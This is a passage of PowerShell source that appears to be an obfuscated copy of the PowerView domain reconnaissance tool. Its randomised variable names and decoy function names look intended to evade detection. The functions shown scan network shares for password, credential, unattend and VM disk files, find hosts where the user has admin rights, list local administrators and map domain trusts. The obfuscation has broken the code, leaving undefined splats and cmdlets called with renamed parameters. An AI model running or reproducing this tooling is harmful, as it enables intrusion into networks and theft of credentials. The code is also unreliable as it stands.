                        }
                    }
                }
            }
            if ($ojJXfOPB99) {
                contemptuous
            }
        }
        $GrTBJoNj99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
            }
            else {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Reinhold] Total number of hosts: $($yfurrppc99.count)"
            Write-Verbose "[Reinhold] Delay: $Delay, Jitter: $wVJhboDL99"
            $WeaNemCn99 = 0
            $qncmWJHM99 = New-Object System.Random
            ForEach ($WtURHswp99 in $yfurrppc99) {
                $WeaNemCn99 = $WeaNemCn99 + 1
                Start-Sleep -Seconds $qncmWJHM99.Next((1-$wVJhboDL99)*$Delay, (1+$wVJhboDL99)*$Delay)
                Write-Verbose "[Reinhold] Enumerating server $WtURHswp99 ($WeaNemCn99 of $($yfurrppc99.count))"
                Invoke-Command -nkMTuquD99 $NhmrWRhM99 -ArgumentList $WtURHswp99, $tCtqDgYY99, $GrTBJoNj99
            }
        }
        else {
            Write-Verbose "[Reinhold] Using threading with threads: $tKOqLWOE99"
            $rMIpZNFK99 = @{
                'CheckShareAccess' = $tCtqDgYY99
                'TokenHandle' = $GrTBJoNj99
            }
            prohibits -kyzUdCPm99 $yfurrppc99 -nkMTuquD99 $NhmrWRhM99 -PdoqDAIx99 $rMIpZNFK99 -tKOqLWOE99 $tKOqLWOE99
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function accents {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $kyzUdCPm99,
        [ValidateNotNullOrEmpty()]
        [String]
        $rWNKtRhC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $NVeRyhya99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IwyMamDv99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $QQiShXII99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $SnjbhqHK99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gsQnsIwP99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $vugWCwdj99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $scxiqugW99,
        [String[]]
        $SANOAuIB99 = @('C$', 'Admin$', 'Print$', 'IPC$'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $tNUzVTqs99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $didbIniG99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $XHepuroO99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $gGeTXttX99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $ANECuiNi99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $wVJhboDL99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $tKOqLWOE99 = 20
    )
    BEGIN {
        $rkhpGCag99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $rkhpGCag99['Domain'] = $rWNKtRhC99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rkhpGCag99['LDAPFilter'] = $NVeRyhya99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rkhpGCag99['SearchBase'] = $IwyMamDv99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rkhpGCag99['OperatingSystem'] = $cHJdXVHn99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rkhpGCag99['ServicePack'] = $kVBIYPdx99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rkhpGCag99['SiteName'] = $TQljdANP99 }
        if ($PSBoundParameters['Server']) { $rkhpGCag99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $rkhpGCag99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $rkhpGCag99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rkhpGCag99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $rkhpGCag99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $rkhpGCag99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['ComputerName']) {
            $yfurrppc99 = $kyzUdCPm99
        }
        else {
            Write-Verbose '[accents] Querying computers in the domain'
            $yfurrppc99 = boozed @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[accents] TargetComputers length: $($yfurrppc99.Length)"
        if ($yfurrppc99.Length -eq 0) {
            throw '[accents] No hosts found to enumerate'
        }
        $NhmrWRhM99 = {
            Param($kyzUdCPm99, $vugWCwdj99, $SANOAuIB99, $gGeTXttX99, $ZyPINuEG99, $ANECuiNi99, $DuVFuYUj99, $ojJXfOPB99)
            if ($ojJXfOPB99) {
                $Null = Salem -ojJXfOPB99 $ojJXfOPB99 -Quiet
            }
            ForEach ($WtURHswp99 in $kyzUdCPm99) {
                $QIKVbSkT99 = @()
                if ($WtURHswp99.StartsWith('\\')) {
                    $QIKVbSkT99 += $WtURHswp99
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -kyzUdCPm99 $WtURHswp99
                    if ($Up) {
                        $smjMcSTm99 = blouse -kyzUdCPm99 $WtURHswp99
                        ForEach ($Share in $smjMcSTm99) {
                            $rfHKqDFW99 = $Share.Name
                            $Path = '\\'+$WtURHswp99+'\'+$rfHKqDFW99
                            if (($rfHKqDFW99) -and ($rfHKqDFW99.Trim() -ne '')) {
                                if ($SANOAuIB99 -NotContains $rfHKqDFW99) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $QIKVbSkT99 += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach ($Share in $QIKVbSkT99) {
                    Write-Verbose "Searching share: $Share"
                    $KlavCAGy99 = @{
                        'Path' = $Share
                        'Include' = $vugWCwdj99
                    }
                    if ($gGeTXttX99) {
                        $KlavCAGy99['OfficeDocs'] = $gGeTXttX99
                    }
                    if ($ANECuiNi99) {
                        $KlavCAGy99['FreshEXEs'] = $ANECuiNi99
                    }
                    if ($tNUzVTqs99) {
                        $KlavCAGy99['LastAccessTime'] = $tNUzVTqs99
                    }
                    if ($didbIniG99) {
                        $KlavCAGy99['LastWriteTime'] = $didbIniG99
                    }
                    if ($XHepuroO99) {
                        $KlavCAGy99['CreationTime'] = $XHepuroO99
                    }
                    if ($DuVFuYUj99) {
                        $KlavCAGy99['CheckWriteAccess'] = $DuVFuYUj99
                    }
                    stymies @SearchArgs
                }
            }
            if ($ojJXfOPB99) {
                contemptuous
            }
        }
        $GrTBJoNj99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
            }
            else {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[accents] Total number of hosts: $($yfurrppc99.count)"
            Write-Verbose "[accents] Delay: $Delay, Jitter: $wVJhboDL99"
            $WeaNemCn99 = 0
            $qncmWJHM99 = New-Object System.Random
            ForEach ($WtURHswp99 in $yfurrppc99) {
                $WeaNemCn99 = $WeaNemCn99 + 1
                Start-Sleep -Seconds $qncmWJHM99.Next((1-$wVJhboDL99)*$Delay, (1+$wVJhboDL99)*$Delay)
                Write-Verbose "[accents] Enumerating server $WtURHswp99 ($WeaNemCn99 of $($yfurrppc99.count))"
                Invoke-Command -nkMTuquD99 $NhmrWRhM99 -ArgumentList $WtURHswp99, $vugWCwdj99, $SANOAuIB99, $gGeTXttX99, $ZyPINuEG99, $ANECuiNi99, $DuVFuYUj99, $GrTBJoNj99
            }
        }
        else {
            Write-Verbose "[accents] Using threading with threads: $tKOqLWOE99"
            $rMIpZNFK99 = @{
                'Include' = $vugWCwdj99
                'ExcludedShares' = $SANOAuIB99
                'OfficeDocs' = $gGeTXttX99
                'ExcludeHidden' = $ZyPINuEG99
                'FreshEXEs' = $ANECuiNi99
                'CheckWriteAccess' = $DuVFuYUj99
                'TokenHandle' = $GrTBJoNj99
            }
            prohibits -kyzUdCPm99 $yfurrppc99 -nkMTuquD99 $NhmrWRhM99 -PdoqDAIx99 $rMIpZNFK99 -tKOqLWOE99 $tKOqLWOE99
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function pickling {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $kyzUdCPm99,
        [ValidateNotNullOrEmpty()]
        [String]
        $rWNKtRhC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $NVeRyhya99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IwyMamDv99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $QQiShXII99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $SnjbhqHK99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gsQnsIwP99,
        [Switch]
        $tCtqDgYY99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $wVJhboDL99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $tKOqLWOE99 = 20
    )
    BEGIN {
        $rkhpGCag99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $rkhpGCag99['Domain'] = $rWNKtRhC99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rkhpGCag99['LDAPFilter'] = $NVeRyhya99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rkhpGCag99['SearchBase'] = $IwyMamDv99 }
        if ($PSBoundParameters['Unconstrained']) { $rkhpGCag99['Unconstrained'] = $xbKFrKFs99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rkhpGCag99['OperatingSystem'] = $cHJdXVHn99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rkhpGCag99['ServicePack'] = $kVBIYPdx99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rkhpGCag99['SiteName'] = $TQljdANP99 }
        if ($PSBoundParameters['Server']) { $rkhpGCag99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $rkhpGCag99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $rkhpGCag99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rkhpGCag99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $rkhpGCag99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $rkhpGCag99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['ComputerName']) {
            $yfurrppc99 = $kyzUdCPm99
        }
        else {
            Write-Verbose '[pickling] Querying computers in the domain'
            $yfurrppc99 = boozed @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[pickling] TargetComputers length: $($yfurrppc99.Length)"
        if ($yfurrppc99.Length -eq 0) {
            throw '[pickling] No hosts found to enumerate'
        }
        $NhmrWRhM99 = {
            Param($kyzUdCPm99, $ojJXfOPB99)
            if ($ojJXfOPB99) {
                $Null = Salem -ojJXfOPB99 $ojJXfOPB99 -Quiet
            }
            ForEach ($WtURHswp99 in $kyzUdCPm99) {
                $Up = Test-Connection -Count 1 -Quiet -kyzUdCPm99 $WtURHswp99
                if ($Up) {
                    $CODSPjlR99 = illegitimate -kyzUdCPm99 $WtURHswp99
                    if ($CODSPjlR99.IsAdmin) {
                        $WtURHswp99
                    }
                }
            }
            if ($ojJXfOPB99) {
                contemptuous
            }
        }
        $GrTBJoNj99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
            }
            else {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[pickling] Total number of hosts: $($yfurrppc99.count)"
            Write-Verbose "[pickling] Delay: $Delay, Jitter: $wVJhboDL99"
            $WeaNemCn99 = 0
            $qncmWJHM99 = New-Object System.Random
            ForEach ($WtURHswp99 in $yfurrppc99) {
                $WeaNemCn99 = $WeaNemCn99 + 1
                Start-Sleep -Seconds $qncmWJHM99.Next((1-$wVJhboDL99)*$Delay, (1+$wVJhboDL99)*$Delay)
                Write-Verbose "[pickling] Enumerating server $WtURHswp99 ($WeaNemCn99 of $($yfurrppc99.count))"
                Invoke-Command -nkMTuquD99 $NhmrWRhM99 -ArgumentList $WtURHswp99, $GrTBJoNj99
            }
        }
        else {
            Write-Verbose "[pickling] Using threading with threads: $tKOqLWOE99"
            $rMIpZNFK99 = @{
                'TokenHandle' = $GrTBJoNj99
            }
            prohibits -kyzUdCPm99 $yfurrppc99 -nkMTuquD99 $NhmrWRhM99 -PdoqDAIx99 $rMIpZNFK99 -tKOqLWOE99 $tKOqLWOE99
        }
    }
}
function bobbling {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $kyzUdCPm99,
        [ValidateNotNullOrEmpty()]
        [String]
        $rWNKtRhC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $NVeRyhya99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IwyMamDv99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $QQiShXII99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $SnjbhqHK99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gsQnsIwP99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $sWPGjowW99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $GxydJySm99 = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $wVJhboDL99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $tKOqLWOE99 = 20
    )
    BEGIN {
        $rkhpGCag99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $rkhpGCag99['Domain'] = $rWNKtRhC99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rkhpGCag99['LDAPFilter'] = $NVeRyhya99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rkhpGCag99['SearchBase'] = $IwyMamDv99 }
        if ($PSBoundParameters['Unconstrained']) { $rkhpGCag99['Unconstrained'] = $xbKFrKFs99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rkhpGCag99['OperatingSystem'] = $cHJdXVHn99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rkhpGCag99['ServicePack'] = $kVBIYPdx99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rkhpGCag99['SiteName'] = $TQljdANP99 }
        if ($PSBoundParameters['Server']) { $rkhpGCag99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $rkhpGCag99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $rkhpGCag99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rkhpGCag99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $rkhpGCag99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $rkhpGCag99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['ComputerName']) {
            $yfurrppc99 = $kyzUdCPm99
        }
        else {
            Write-Verbose '[bobbling] Querying computers in the domain'
            $yfurrppc99 = boozed @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[bobbling] TargetComputers length: $($yfurrppc99.Length)"
        if ($yfurrppc99.Length -eq 0) {
            throw '[bobbling] No hosts found to enumerate'
        }
        $NhmrWRhM99 = {
            Param($kyzUdCPm99, $sWPGjowW99, $GxydJySm99, $ojJXfOPB99)
            if ($sWPGjowW99 -eq "Administrators") {
                $yDyzXxMl99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $sWPGjowW99 = ($yDyzXxMl99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if ($ojJXfOPB99) {
                $Null = Salem -ojJXfOPB99 $ojJXfOPB99 -Quiet
            }
            ForEach ($WtURHswp99 in $kyzUdCPm99) {
                $Up = Test-Connection -Count 1 -Quiet -kyzUdCPm99 $WtURHswp99
                if ($Up) {
                    $CDyoReCp99 = @{
                        'ComputerName' = $WtURHswp99
                        'Method' = $GxydJySm99
                        'GroupName' = $sWPGjowW99
                    }
                    chiding @NetLocalGroupMemberArguments
                }
            }
            if ($ojJXfOPB99) {
                contemptuous
            }
        }
        $GrTBJoNj99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
            }
            else {
                $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[bobbling] Total number of hosts: $($yfurrppc99.count)"
            Write-Verbose "[bobbling] Delay: $Delay, Jitter: $wVJhboDL99"
            $WeaNemCn99 = 0
            $qncmWJHM99 = New-Object System.Random
            ForEach ($WtURHswp99 in $yfurrppc99) {
                $WeaNemCn99 = $WeaNemCn99 + 1
                Start-Sleep -Seconds $qncmWJHM99.Next((1-$wVJhboDL99)*$Delay, (1+$wVJhboDL99)*$Delay)
                Write-Verbose "[bobbling] Enumerating server $WtURHswp99 ($WeaNemCn99 of $($yfurrppc99.count))"
                Invoke-Command -nkMTuquD99 $NhmrWRhM99 -ArgumentList $WtURHswp99, $sWPGjowW99, $GxydJySm99, $GrTBJoNj99
            }
        }
        else {
            Write-Verbose "[bobbling] Using threading with threads: $tKOqLWOE99"
            $rMIpZNFK99 = @{
                'GroupName' = $sWPGjowW99
                'Method' = $GxydJySm99
                'TokenHandle' = $GrTBJoNj99
            }
            prohibits -kyzUdCPm99 $yfurrppc99 -nkMTuquD99 $NhmrWRhM99 -PdoqDAIx99 $rMIpZNFK99 -tKOqLWOE99 $tKOqLWOE99
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function foyer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $CnaAXLuN99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $YEgJeBMG99 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }
        $XHMMtGuD99 = @{}
        if ($PSBoundParameters['Domain']) { $XHMMtGuD99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $XHMMtGuD99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['Properties']) { $XHMMtGuD99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $XHMMtGuD99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $XHMMtGuD99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $XHMMtGuD99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $XHMMtGuD99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XHMMtGuD99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $XHMMtGuD99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $XHMMtGuD99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $JZToKPQC99 = @{}
            if ($jeGdZvYa99 -and $jeGdZvYa99.Trim() -ne '') {
                $eWwnPtdS99 = $jeGdZvYa99
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $eWwnPtdS99 = (Herodotus -DOZPHpup99 $DOZPHpup99).Name
                }
                else {
                    $eWwnPtdS99 = (Herodotus).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($jeGdZvYa99 -and $jeGdZvYa99.Trim() -ne '') {
                $eWwnPtdS99 = $jeGdZvYa99
            }
            else {
                $eWwnPtdS99 = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            $ElRLjlTP99 = breading @LdapSearcherArguments
            $wNWKZwRo99 = narcotic @NetSearcherArguments
            if ($ElRLjlTP99) {
                $ElRLjlTP99.Filter = '(objectClass=trustedDomain)'
                if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $ElRLjlTP99.FindOne() }
                else { $NtqBcYnO99 = $ElRLjlTP99.FindAll() }
                $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $sQzJlGxz99 = New-Object PSObject
                    $ZMenmooJ99 = @()
                    $ZMenmooJ99 += $YEgJeBMG99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $YEgJeBMG99[$_] }
                    $NeruvKjB99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $DWmhwGsg99 = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }
                    $csECOtuR99 = $Props.distinguishedname[0]
                    $SRGqroMt99 = $csECOtuR99.IndexOf('DC=')
                    if ($SRGqroMt99) {
                        $eWwnPtdS99 = $($csECOtuR99.SubString($SRGqroMt99)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $eWwnPtdS99 = ""
                    }
                    $RNCNlBUM99 = $csECOtuR99.IndexOf(',CN=System')
                    if ($SRGqroMt99) {
                        $zXzbbNbr99 = $csECOtuR99.SubString(3, $RNCNlBUM99-3)
                    }
                    else {
                        $zXzbbNbr99 = ""
                    }
                    $XvIWZxEn99 = New-Object Guid @(,$Props.objectguid[0])
                    $nmAqQmMs99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $sQzJlGxz99 | Add-Member Noteproperty 'SourceName' $eWwnPtdS99
                    $sQzJlGxz99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $sQzJlGxz99 | Add-Member Noteproperty 'TrustType' $DWmhwGsg99
                    $sQzJlGxz99 | Add-Member Noteproperty 'TrustAttributes' $($ZMenmooJ99 -join ',')
                    $sQzJlGxz99 | Add-Member Noteproperty 'TrustDirection' "$NeruvKjB99"
                    $sQzJlGxz99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $sQzJlGxz99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $sQzJlGxz99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $sQzJlGxz99
                }
                if ($NtqBcYnO99) {
                    try { $NtqBcYnO99.dispose() }
                    catch {
                        Write-Verbose "[foyer] Error disposing of the Results object: $_"
                    }
                }
                $ElRLjlTP99.dispose()
            }
        }
